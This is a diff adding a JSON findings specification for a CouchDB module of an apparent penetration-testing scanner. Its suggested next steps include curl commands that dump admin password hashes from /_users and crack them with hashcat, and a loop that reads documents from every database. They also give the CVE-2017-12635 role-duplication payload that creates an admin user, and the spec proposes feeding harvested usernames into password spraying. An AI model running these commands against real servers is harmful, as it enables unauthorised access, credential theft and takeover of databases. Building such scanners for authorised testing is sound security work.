@@ -1,0 +1,55 @@
+{
+  "service": "couchdb",
+  "summary": "Compact but sharp: two independent unauth discriminators (/_all_dbs and /_node/_local/_config for admin-party) plus Fauxton UI detection and a CVE-2017-12635/12636 version flag. Coverage gaps: no /_membership node harvest into a shared pool, no /_users database read on admin-party (would surface admin bcrypt hashes), no basic-auth cred sweep, and CVE-2017-12635 is not actively verified (just version-gated).",
+  "module_files": [
+    "recce/services/db/couchdb.py"
+  ],
+  "findings": [
+    {
+      "kind": "couchdb_admin_party",
+      "title_pattern": "Apache CouchDB 'admin party' (no admin configured)",
+      "severity": "critical",
+      "tier": "t2",
+      "tier_evidence": "GET /_node/_local/_config returns 200 with a JSON dict - reading an ADMIN-only endpoint proves the request is treated as admin.",
+      "can_promote_to": "t3",
+      "promotion_notes": "T3 non-destructive: read /_users/_all_docs?include_docs=true for admin bcrypt hashes and secret cookies. Destructive T3: PUT a query_server or os_daemon to trigger RCE - keep behind an --exploit-ok gate.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "curl -s http://<ip>:<port>/_users/_all_docs?include_docs=true | jq '.rows[].doc | {n:.name,h:.derived_key}' ; then hashcat -m 12100 (PBKDF2-SHA1) the derived keys.",
+      "related_cves": [
+        "CVE-2017-12636"
+      ]
+    },
+    {
+      "kind": "couchdb_unauth_dbs",
+      "title_pattern": "Apache CouchDB exposed - unauthenticated database listing",
+      "severity": "high",
+      "tier": "t2",
+      "tier_evidence": "GET /_all_dbs returns 200 with a real JSON array (sampled to 25 names) - proof of read access to the DB inventory.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Auto-follow /_all_dbs -> GET /<db>/_all_docs?include_docs=true&limit=5 per non-underscore db to surface real document samples (as elasticsearch does for indices).",
+      "promotion_risk": "low",
+      "tester_next_step": "for db in $(curl -s http://<ip>:<port>/_all_dbs | jq -r '.[]' | grep -v ^_); do curl -s http://<ip>:<port>/$db/_all_docs?include_docs=true\\&limit=5; done",
+      "related_cves": []
+    },
+    {
+      "kind": "couchdb_version",
+      "title_pattern": "Apache CouchDB < 2.1.1 - unauth privesc -> RCE chain",
+      "severity": "high",
+      "tier": "t0",
+      "tier_evidence": "vulndb._cmp against 2.1.1 - version-only fingerprint; no CVE-2017-12635 role-duplication POST fired.",
+      "can_promote_to": "t2",
+      "promotion_notes": "T2 = actually PUT /_users/org.couchdb.user:recce with the JSON role-duplication payload from CVE-2017-12635 and verify 201/200 (destructive - creates a user). Non-destructive T1: send the payload with an invalid Content-Type to trigger the exact validator branch without persisting.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "curl -s -X PUT http://<ip>:<port>/_users/org.couchdb.user:recce -H 'Content-Type: application/json' -d '{\"type\":\"user\",\"name\":\"recce\",\"roles\":[\"_admin\"],\"roles\":[],\"password\":\"pw\"}' - only in scope.",
+      "related_cves": [
+        "CVE-2017-12635",
+        "CVE-2017-12636"
+      ]
+    }
+  ],
+  "proposed_shared_surface_consumers": [
+    "cluster_pool (/_membership node list)",
+    "credentials.hash (_users PBKDF2 hashes for hashcat 12100)",
+    "known_users (couchdb admin/user names -> spray)"
+  ]
+}
